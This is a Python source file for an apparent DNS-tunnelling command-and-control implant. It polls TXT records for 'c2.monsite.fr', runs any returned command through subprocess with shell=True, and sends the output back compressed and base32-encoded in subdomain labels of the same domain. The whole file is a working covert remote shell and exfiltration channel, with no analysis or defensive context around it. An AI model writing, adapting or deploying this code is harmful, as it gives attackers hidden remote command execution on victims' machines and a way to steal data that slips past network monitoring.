# ===== Imports =====

import socket
import struct
import subprocess
from zlib import compress
from base64 import b32encode
from time import sleep


# ===== Variables =====

ip = "127.0.0.1"
pollingDomain = "c2.monsite.fr"
sendingDomain = ".c2.monsite.fr"


# ===== Functions =====

def encode_name(name: str) -> bytes:
    result = b""
    for part in name.split("."):
        result += bytes([len(part)]) + part.encode()
    return result + b"\x00"


def decode_name(data: bytes, offset: int) -> tuple[str | int]:
    labels = []
    while data[offset]:
        length = data[offset]
        offset += 1
        labels.append(data[offset:offset + length].decode())
        offset += length
    return ".".join(labels), offset + 1


def dns_query(
        name: str, server: str = ip,
        port: int = 53, qtype: int = 16
) -> bytes:
    encoded = encode_name(name)
    query = struct.pack("!HHHHHH", 0xAAAA, 0x0100, 1, 0, 0, 0)
    query += encoded + struct.pack("!HH", qtype, 1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(query, (server, port))
    response = sock.recvfrom(4096)[0]
    sock.close()

    return response


def handle_response(data: bytes) -> str | None:
    (
        id, flags,
        qdcount, ancount,
        nscount, arcount
    ) = struct.unpack("!HHHHHH", data[:12])

    if ancount == 1:
        name, offset = decode_name(data, 12)
        offset += 4

        name, offset = decode_name(data, offset)
        offset += 10

        commandLength = data[offset]
        command = data[offset+1:offset+1+commandLength].decode()
        return command
    else:
        return None


def execute_command(command: str) -> str:
    cmd_parts = command.split()
    try:
        result = subprocess.run(
            cmd_parts,
            capture_output=True,
            text=True,
            timeout=10,
            shell=True
        )
        if result.returncode == 0:
            return result.stdout
        return result.stderr or f"error: {result.returncode}"
    except FileNotFoundError:
        return "error: command not found"
    except subprocess.TimeoutExpired:
        return "error: timeout (10s)"


def send_command_result(result: str) -> None:
    compressedResult = compress(result.encode())
    encodedResult = b32encode(compressedResult).rstrip(b"=").decode()
    chunks = [encodedResult[i:i+63] for i in range(0, len(encodedResult), 63)]
    if len(chunks) % 2 == 1:
        chunks.append('')
    for i in range(len(chunks) // 2):
        sleep(0.2)
        name = (".".join(
            [chunks[i*2], chunks[i*2+1]]
        ) + sendingDomain).replace('..', '.')

        response = dns_query(name, "127.0.0.1", qtype=16)

        (
            id, flags,
            qdcount, ancount,
            nscount, arcount
        ) = struct.unpack("!HHHHHH", response[:12])

        if ancount != 1:
            break


# ===== Execution =====

if __name__ == '__main__':
    while True:
        response = dns_query(pollingDomain, ip)
        command = handle_response(response)
        if command:
            send_command_result(execute_command(command))
        sleep(10)
